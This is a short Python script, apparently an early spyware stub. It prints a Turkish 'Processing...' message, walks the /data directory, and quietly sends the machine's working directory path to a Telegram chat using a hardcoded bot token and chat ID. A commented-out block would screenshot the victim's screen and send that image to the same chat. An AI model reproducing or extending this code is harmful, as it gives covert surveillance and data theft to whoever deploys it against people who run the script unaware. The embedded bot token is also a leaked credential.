import time
import random
import requests
import os
import datetime
from telepot import Bot
#from mss import mss


def program():
	bot = Bot("1577645641:AAGRYQ_mhUKtzYWljht_N4z6JM64z5-DwBg")
	print("İşleniyor...")
	time.sleep(2)

	yol = os.getcwd()
	print("STARTER")
	for i in os.walk("/data"):
     		print(i)

	#print(yol)
	
	"""
	try:
	    with mss() as foto:
		    bot.sendPhoto("1320900188", photo=open(foto.shot(), "rb"))
		    os.remove("monitor-1.png")
	except:
			bot.sendMessage("1320900188", "Foto Çekilemedi !")
	"""
	bot.sendMessage("1320900188", yol)


def program2():
	pass


program()
#program2()
